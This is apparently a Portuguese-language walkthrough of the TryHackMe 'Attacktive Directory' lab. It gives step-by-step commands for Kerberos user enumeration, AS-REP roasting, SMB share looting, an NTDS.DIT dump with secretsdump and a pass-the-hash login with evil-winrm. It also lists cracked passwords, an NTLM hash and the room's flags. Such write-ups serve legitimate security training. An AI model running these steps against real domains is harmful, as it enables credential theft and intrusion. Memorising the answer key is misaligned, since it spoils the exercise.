# Attacktive-Directory

#TASK 3 - Enumeração Bem-vindo ao Diretório Attacktive

Questions

nmap -n -T4 -sCV $TARGET_IP

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/48b2485d-b7e0-4bbc-a3e2-d9d8b87a8fa6)

1 - Qual ferramenta nos permitirá enumerar a porta 139/445?
R: enum4linux

enum4linux -U $TARGET_IP

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/9b888e47-7d55-4d9b-84b6-4f178c34f684)

2 - Qual é o nome de domínio NetBIOS da máquina?
R: THM-AD

Na imagem abaixo podemos observar que não tem um domínio, então a máquina é local.

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/e30c3c0c-8bd7-4da3-8417-53b0e0004e3b)

3 - Qual TLD inválido as pessoas costumam usar para seu domínio do Active Directory?
R: .local

#TASK 4 -  Enumeração Enumerando usuários via Kerberos

Download · [ropnop/kerbrute · GitHub](https://github.com/ropnop/kerbrute/releases/) - Github

Terminal commands

chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64

Renomear o diretório
mkdir /opt/kerbrute
cp kerbrute_linux_amd64 /opt/kerbrute/kerbrute

Baixar lista de usuários e senhas

wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt


Questions

./kerbrute -h

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/5b192e04-bfe3-42e3-a4c1-208411f4e310)


1 - Qual comando do Kerbrute nos permitirá enumerar nomes de usuários válidos?
R: userenum

sudo nano /etc/hosts
adicionar IP e domínio

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/32be622c-6d70-440b-a727-c8d246825edd)

/opt/kerbrute/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt

2 - Que conta notável é descoberta? (Estes devem saltar para você)
R: svc-admin

3 - Qual é a outra conta notável descoberta? (Estes devem saltar para você)
R: backup


# TASK 5 - Exploitation Abusing Kerberos

Questions

GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip 10.10.154.98

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/0054948e-1362-4e20-9468-b8dd9b73ec10)

GetNPUsers.py spookysec.local/backup -request -no-pass -dc-ip 10.10.154.98

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/45d06cfb-0017-415d-ac4f-54821eb71ebc)


1 - Temos duas contas de usuário nas quais poderíamos consultar um ticket. De qual conta de usuário você pode consultar um ticket sem senha?
R: svc-admin

https://hashcat.net/wiki/doku.php?id=example_hashes
Hash mode: 18200
Hash name: Kerberos 5 AS-REP etype 23

2 - Olhando para a página Wiki de exemplos de Hashcat, que tipo de hash Kerberos recuperamos do KDC? (Especifique o nome completo)
R: Kerberos 5 AS-REP etype 23

3 - Qual modo é o hash?
R: 18200

4 - Agora quebre o hash com a lista de senhas modificadas fornecida, qual é a senha das contas de usuário?
R: management2005

# TASK 6 - Enumeration Back to the Basics

Questions

1 - Que utilitário podemos usar para mapear compartilhamentos SMB remotos?
R: SMBClient

2 - Qual opção listará os compartilhamentos?
R: -L

smbclient -U spookysec.local/svc-admin -L //10.10.154.98

![image](https://github.com/yanfernandess/Attacktive-Directory/assets/100174458/58c665df-c15f-48cb-9662-6a8f841d3cd1)


3 - Quantos compartilhamentos remotos o servidor está listado?
R: 6

4 - Há um compartilhamento específico ao qual temos acesso que contém um arquivo de texto. Qual é a parcela?
R: backup

smbclient -U spookysec.local/svc-admin //10.10.154.98/backup

ls
get backup_credentials.txt
cat backup_credentials.txt

5 - Qual é o conteúdo do arquivo?
R: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d

6 - Decodificando o conteúdo do arquivo, qual é o conteúdo completo?
R: backup@spookysec.local:backup2517860

# TASK 7 - Domain Privilege Escalation Elevating Privileges within the Domain

Questions

1 - Qual método nos permitiu descartar o NTDS.DIT?
R: DRSUAPI

secretsdump.py -dc-ip 10.10.154.98 spookysec.local/backup:backup2517860@10.10.154.98

2 - Qual é o hash NTLM dos administradores?
R: 0e0363213e37b94221497260b0bcb4fc

3 - Que método de ataque poderia nos permitir autenticar como usuário sem a senha?
R: pass the hash

4 - Usando uma ferramenta chamada Evil-WinRM, qual opção nos permitirá usar um hash?
R: -H

# TASK 8 - Flag Submission Flag Submission Panel

evil-winrm -i 10.10.154.98 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
cd \users
more svc-admin\desktop\user.txt.txt

svc-admin
R: TryHackMe{K3rb3r0s_Pr3_4uth}

more backup\desktop\PrivEsc.txt

backup
R: TryHackMe{B4ckM3UpSc0tty!}

more administrator\desktop\root.txt

Administrator
R: TryHackMe{4ctiveD1rectoryM4st3r}
